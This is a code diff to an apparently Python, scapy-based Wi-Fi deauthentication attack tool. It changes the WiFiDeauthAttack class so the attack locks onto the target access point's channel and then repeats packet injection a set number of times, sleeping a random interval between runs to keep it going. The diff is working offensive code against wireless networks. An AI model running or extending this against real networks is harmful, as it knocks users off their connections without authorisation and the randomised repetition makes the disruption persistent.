@@ -1,3 +1,6 @@
+import random
+import time
+
 from itertools import chain
 
 from scapy.all import sendp, RadioTap, Dot11, Dot11ProbeResp,\
@@ -21,14 +24,18 @@ class WiFiDeauthAttack(object):
         self.interface = WiFiInterface(interface)
         self.bssid = bssid.lower()
         
-    def run(self):
+    def run(self, executions, persistence_times):
         # First, retrieve the channel used by the target AP in order to
         # configure the wireless interface so it can inject deauth packets.
         channel = ChannelFinder(self.interface, self.bssid).find()
         self.interface.set_channel(channel)
 
-        # Finally, run the attack.
+        # Finally, run the attack as many times as requested.
         self._do_run()
+        for _ in range(executions-1):
+            idle_time = random.randint(*persistence_times)
+            time.sleep(idle_time)
+            self._do_run()
         
     def _build_packet(self, seq, source, dest, body):
         encoded_seq = seq << 4
